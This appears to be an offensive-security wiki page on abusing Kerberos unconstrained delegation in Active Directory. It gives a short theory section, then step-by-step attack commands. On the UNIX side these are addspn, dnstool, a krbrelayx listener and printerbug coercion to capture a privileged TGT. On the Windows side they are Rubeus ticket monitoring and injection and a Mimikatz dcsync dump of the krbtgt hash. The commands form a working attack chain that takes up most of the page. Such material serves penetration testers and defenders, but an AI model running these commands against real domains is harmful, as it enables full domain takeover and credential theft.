## Theory
If an account (user or computer), with unconstrained delegations privileges, is compromised, an attacker must wait for a privileged user to authenticate on it (or force it) using Kerberos. The attacker service will receive an ST (service ticket) containing the user's TGT. That TGT will be used by the service as a proof of identity to obtain access to a target service as the target user. Alternatively, the TGT can be used with S4U2self abuse in order to gain local admin privileges over the TGT's owner.
## Exploit
=== "UNIX-like"
    In order to abuse the unconstrained delegations privileges of an account, an attacker must add his machine to its SPNs (i.e. of the compromised account) and add a DNS entry for that name.

    This allows targets (e.g. Domain Controllers or Exchange servers) to authenticate back to the attacker machine.

    All of this can be done from UNIX-like systems with [addspn](https://github.com/dirkjanm/krbrelayx), [dnstool](https://github.com/dirkjanm/krbrelayx) and krbrelayx (Python).
    !!! note
        When attacking accounts able to delegate without constraints, there are two major scenarios

        - the account is a computer: computers can edit their own SPNs via the `msDS-AdditionalDnsHostName` attribute. Since ticket received by `krbrelayx` will be encrypted with AES256 (by default), attackers will need to either supply the right AES256 key for the unconstrained delegations account (`--aesKey` argument) or the salt and password (`--krbsalt` and `-`-krbpass` arguments).
        - the account is a user: users can't edit their own SPNs like computers do. Attackers need to control an account operator (or any other user that has the needed privileges) to edit the user's SPNs. Moreover, since tickets received by krbrelayx will be encrypted with RC4, attackers will need to either supply the NT hash (`-hashes` argument) or the salt and password (`--krbsalt` and `--krbpass` arguments)
    !!! info
        By default, the salt is always

        - For users: uppercase FQDN + case sensitive username = DOMAIN.LOCALuser
        - For computers: uppercase FQDN + hardcoded host text + lowercase FQDN hostname without the trailing $ = DOMAIN.LOCALhostcomputer.domain.local
        (using DOMAIN.LOCAL\computer$ account)
    
    ```bash
    # 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
    addspn.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'

    # 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs
    dnstool.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'

    # 3. Check that the record was added successfully (after ~3 minutes)
    nslookup attacker.DOMAIN_FQDN DomainController

    # 4. Start the krbrelayx listener (the tool needs the right kerberos key to decrypt the ticket it will receive)
    # 4.a. either specify the salt and password. krbrelayx will calculate the kerberos keys
    krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'
    # 4.b. or supply the right Kerberos long-term key directly
    krbrelayx.py -aesKey aes256-cts-hmac-sha1-96-VALUE

    # 5. Authentication coercion
    # PrinterBug, PetitPotam, PrivExchange, ...
    printerbug.py domain/'vuln_account$'@'DC_IP' -hashes LM:NT 'DomainController'

    # 6. Check if it works. Krbrelayx should have received and decrypted a ticket, extracting the coerced principal's TGT.
    # There should be a krbtgt ccache file in the current directory. And it can be used by
    export KRB5CCNAME=`pwd`/'krbtgt.ccache'
    ```
=== "Windows"
    Once the KUD capable host is compromised, Rubeus can be used (on the compromised host) as a listener to wait for a user to authenticate, the ST to show up and to extract the TGT it contains.
    ```bash
    Rubeus.exe monitor /interval:5
    ```
    Once the monitor is ready, a forced authentication attack (e.g. PrinterBug, PrivExchange) can be operated. Rubeus will then receive an authentication (hence a Service Ticket, containing a TGT). The TGT can be used to request a Service Ticket for another service.
    ```bash
    Rubeus.exe asktgs /ticket:$base64_extracted_TGT /service:$target_SPN /ptt
    ```
    Alternatively, the TGT can be used with S4U2self abuse in order to gain local admin privileges over the TGT's owner.

    Once the TGT is injected, it can natively be used when accessing a service. For example, with Mimikatz, to extract the krbtgt hash with `lsadump::dcsync`.
    ```bash
    lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
    ```